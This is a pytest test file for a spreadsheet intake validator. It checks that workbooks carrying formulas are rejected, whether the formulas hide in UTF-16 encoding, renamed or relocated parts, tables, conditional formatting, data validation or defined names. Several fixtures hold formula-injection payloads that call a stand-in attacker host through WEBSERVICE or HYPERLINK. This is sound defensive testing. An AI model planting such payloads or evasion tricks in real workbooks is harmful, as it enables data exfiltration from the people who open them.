"""A formula must not reach the priced workbook, whatever encoding or part name hides it."""

import io
import re
from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile

import pytest
from openpyxl import load_workbook

from app.intake import IntakeValidationError, validate_openxml_package
from app.workbook_export import UnsafeSourceWorkbookError, build_priced_workbook

SAMPLE = Path(__file__).resolve().parents[3] / "samples" / "synthetic_intake_completed.xlsx"
FORMULA = '=HYPERLINK("https://attacker.example/","x")'


def _formula_workbook() -> bytes:
    workbook = load_workbook(SAMPLE)
    workbook["2 Servers"]["A40"] = FORMULA
    stream = io.BytesIO()
    workbook.save(stream)
    return stream.getvalue()


def _parts(content: bytes) -> dict[str, bytes]:
    with ZipFile(io.BytesIO(content)) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def _package(parts: dict[str, bytes]) -> bytes:
    stream = io.BytesIO()
    with ZipFile(stream, "w", ZIP_DEFLATED) as archive:
        for name, data in parts.items():
            archive.writestr(name, data)
    return stream.getvalue()


def _formula_part(parts: dict[str, bytes]) -> str:
    return next(name for name, data in parts.items() if name.startswith("xl/worksheets/") and b"<f>" in data)


def _move_part(parts: dict[str, bytes], old: str, new: str) -> dict[str, bytes]:
    moved = {new if name == old else name: data for name, data in parts.items()}
    old_target, new_target = old.removeprefix("xl/"), new.removeprefix("xl/")
    rels = "xl/_rels/workbook.xml.rels"
    moved[rels] = moved[rels].replace(old_target.encode(), new_target.encode())
    moved["[Content_Types].xml"] = moved["[Content_Types].xml"].replace(f"/{old}".encode(), f"/{new}".encode())
    return moved


def test_the_sample_is_still_accepted() -> None:
    validate_openxml_package(SAMPLE.read_bytes())


def test_a_utf16_worksheet_cannot_hide_a_formula() -> None:
    parts = _parts(_formula_workbook())
    name = _formula_part(parts)
    text = parts[name].decode("utf-8")
    text = re.sub(r'encoding="[^"]+"', 'encoding="UTF-16"', text, count=1)
    parts[name] = text.encode("utf-16")
    assert b"<f>" not in parts[name]  # The byte pattern alone no longer sees it.
    with pytest.raises(IntakeValidationError, match="formulas are not accepted"):
        validate_openxml_package(_package(parts))


def test_a_worksheet_renamed_off_xml_is_rejected() -> None:
    parts = _parts(_formula_workbook())
    name = _formula_part(parts)
    moved = _move_part(parts, name, name.removesuffix(".xml") + ".bin")
    with pytest.raises(IntakeValidationError, match="unsupported OpenXML parts"):
        validate_openxml_package(_package(moved))


def test_a_worksheet_stored_outside_the_worksheets_folder_is_rejected() -> None:
    parts = _parts(SAMPLE.read_bytes())
    name = next(name for name in parts if re.fullmatch(r"xl/worksheets/sheet\d+\.xml", name))
    moved = _move_part(parts, name, "xl/tables/" + name.rsplit("/", 1)[-1])
    with pytest.raises(IntakeValidationError, match="outside xl/worksheets/"):
        validate_openxml_package(_package(moved))


@pytest.mark.parametrize("element", ["calculatedColumnFormula", "totalsRowFormula"])
def test_a_table_formula_is_rejected(element: str) -> None:
    parts = _parts(SAMPLE.read_bytes())
    parts["xl/tables/table9.xml"] = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<table xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" id="9" name="T" ref="A1:A2">'
        f'<tableColumns count="1"><tableColumn id="1" name="c"><{element}>WEBSERVICE("x")</{element}>'
        "</tableColumn></tableColumns></table>"
    ).encode()
    with pytest.raises(IntakeValidationError, match="formulas are not accepted"):
        validate_openxml_package(_package(parts))


RULES = {
    "conditional-formatting": (
        '<conditionalFormatting sqref="A1:Z99"><cfRule type="expression" priority="1">'
        '<formula>LEN(WEBSERVICE("https://attacker.example/"))&gt;0</formula></cfRule></conditionalFormatting>'
    ),
    "data-validation": (
        '<dataValidations count="1"><dataValidation type="list" sqref="A1">'
        '<formula1>WEBSERVICE("https://attacker.example/")</formula1></dataValidation></dataValidations>'
    ),
    "color-scale-cfvo": (
        '<conditionalFormatting sqref="A1:Z99"><cfRule type="colorScale" priority="1"><colorScale>'
        '<cfvo type="formula" val="LEN(WEBSERVICE(&quot;https://attacker.example/&quot;))"/><cfvo type="max"/>'
        '<color rgb="FFFF0000"/><color rgb="FF00FF00"/></colorScale></cfRule></conditionalFormatting>'
    ),
}


@pytest.mark.parametrize("rule", RULES.values(), ids=RULES.keys())
def test_a_rule_formula_is_rejected(rule: str) -> None:
    parts = _parts(SAMPLE.read_bytes())
    name = next(name for name in parts if re.fullmatch(r"xl/worksheets/sheet\d+\.xml", name))
    parts[name] = parts[name].replace(b"</sheetData>", b"</sheetData>" + rule.encode(), 1)
    with pytest.raises(IntakeValidationError, match="formulas are not accepted"):
        validate_openxml_package(_package(parts))


def test_a_decoy_workbook_part_is_rejected() -> None:
    parts = _parts(SAMPLE.read_bytes())
    parts["xl/tables/wb.xml"] = parts["xl/workbook.xml"]
    parts["[Content_Types].xml"] = parts["[Content_Types].xml"].replace(
        b'PartName="/xl/workbook.xml"', b'PartName="/xl/tables/wb.xml"'
    )
    with pytest.raises(IntakeValidationError, match="not at xl/workbook.xml"):
        validate_openxml_package(_package(parts))


def test_an_office_document_relationship_elsewhere_is_rejected() -> None:
    parts = _parts(SAMPLE.read_bytes())
    parts["_rels/.rels"] = parts["_rels/.rels"].replace(b'Target="xl/workbook.xml"', b'Target="xl/tables/wb.xml"')
    parts["xl/tables/wb.xml"] = parts["xl/workbook.xml"]
    with pytest.raises(IntakeValidationError, match="not at xl/workbook.xml"):
        validate_openxml_package(_package(parts))


@pytest.mark.parametrize("kind", ["conditional-formatting", "data-validation"])
def test_export_refuses_rules_that_evaluate_formulas(kind: str) -> None:
    from openpyxl.formatting.rule import FormulaRule
    from openpyxl.worksheet.datavalidation import DataValidation

    workbook = load_workbook(SAMPLE)
    sheet = workbook["2 Servers"]
    if kind == "conditional-formatting":
        sheet.conditional_formatting.add("A1:B2", FormulaRule(formula=['LEN(WEBSERVICE("x"))>0']))
    else:
        validation = DataValidation(type="list", formula1='WEBSERVICE("x")')
        validation.add("A1")
        sheet.add_data_validation(validation)
    stream = io.BytesIO()
    workbook.save(stream)
    with pytest.raises(UnsafeSourceWorkbookError, match="conditional formatting or data validation"):
        build_priced_workbook(stream.getvalue(), detail=None, view=None)  # type: ignore[arg-type]


def _with_defined_name(name: str, value: str) -> bytes:
    parts = _parts(SAMPLE.read_bytes())
    parts["xl/workbook.xml"] = parts["xl/workbook.xml"].replace(
        b"<definedNames/>", f'<definedNames><definedName name="{name}" localSheetId="0">{value}</definedName></definedNames>'.encode()
    )
    return _package(parts)


def test_a_defined_name_formula_is_rejected() -> None:
    with pytest.raises(IntakeValidationError, match="defined names"):
        validate_openxml_package(_with_defined_name("exfil", 'WEBSERVICE("https://attacker.example/")'))
    with pytest.raises(IntakeValidationError, match="defined names"):
        validate_openxml_package(_with_defined_name("_xlnm.Print_Area", 'WEBSERVICE("x")'))


def test_a_print_area_is_still_accepted() -> None:
    validate_openxml_package(_with_defined_name("_xlnm.Print_Area", "'1 App Basics'!$A$1:$D$20"))


def test_filters_and_quoted_sheet_names_are_accepted() -> None:
    workbook = load_workbook(SAMPLE)
    workbook["2 Servers"].auto_filter.ref = "A1:K4"
    notes = workbook.create_sheet("Owner's Notes")
    notes["A1"] = "plain"
    notes.print_area = "A1:B2"
    stream = io.BytesIO()
    workbook.save(stream)
    validate_openxml_package(stream.getvalue())


def test_a_crafted_defined_name_is_rejected_quickly() -> None:
    import time

    started = time.perf_counter()
    with pytest.raises(IntakeValidationError, match="defined names"):
        validate_openxml_package(_with_defined_name("_xlnm.Print_Area", "A!A1" * 400 + "?"))
    assert time.perf_counter() - started < 2


def test_a_table_totals_function_is_rejected() -> None:
    from openpyxl.worksheet.table import Table

    workbook = load_workbook(SAMPLE)
    sheet = workbook["Platform + FinOps"]
    sheet["Z1"], sheet["Z2"], sheet["Z3"] = "Amount", 1, 2
    table = Table(displayName="Totals", ref="Z1:Z4")
    table._initialise_columns()
    table.totalsRowCount = 1
    table.tableColumns[0].totalsRowFunction = "sum"
    sheet.add_table(table)
    stream = io.BytesIO()
    workbook.save(stream)
    with pytest.raises(IntakeValidationError, match="formulas are not accepted"):
        validate_openxml_package(stream.getvalue())
    with pytest.raises(UnsafeSourceWorkbookError, match="calculated table column"):
        build_priced_workbook(stream.getvalue(), detail=None, view=None)  # type: ignore[arg-type]


def test_a_sheet_that_loads_a_non_worksheet_part_is_rejected() -> None:
    parts = _parts(SAMPLE.read_bytes())
    rels = "xl/_rels/workbook.xml.rels"
    parts[rels] = parts[rels].replace(
        b"</Relationships>",
        b'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme"'
        b' Target="theme/theme1.xml"/></Relationships>',
    )
    parts["xl/workbook.xml"] = parts["xl/workbook.xml"].replace(
        b"</sheets>", b'<sheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
        b' name="Theme" sheetId="99" r:id="rId99"/></sheets>'
    )
    with pytest.raises(IntakeValidationError, match="not a worksheet"):
        validate_openxml_package(_package(parts))


def test_export_refuses_defined_names() -> None:
    from openpyxl.workbook.defined_name import DefinedName

    workbook = load_workbook(SAMPLE)
    workbook.defined_names["exfil"] = DefinedName("exfil", attr_text='WEBSERVICE("x")')
    stream = io.BytesIO()
    workbook.save(stream)
    with pytest.raises(UnsafeSourceWorkbookError, match="defined names"):
        build_priced_workbook(stream.getvalue(), detail=None, view=None)  # type: ignore[arg-type]


def test_a_dtd_in_any_encoding_is_rejected() -> None:
    parts = _parts(SAMPLE.read_bytes())
    parts["docProps/app.xml"] = (
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a "b">]><x>&a;</x>'
    ).encode("utf-16")
    with pytest.raises(IntakeValidationError):
        validate_openxml_package(_package(parts))


def test_export_refuses_a_source_workbook_with_a_formula() -> None:
    # Second line of defence: the export recalculates on open, so a formula that got past intake is refused.
    with pytest.raises(UnsafeSourceWorkbookError, match=r"2 Servers!A40"):
        build_priced_workbook(_formula_workbook(), detail=None, view=None)  # type: ignore[arg-type]
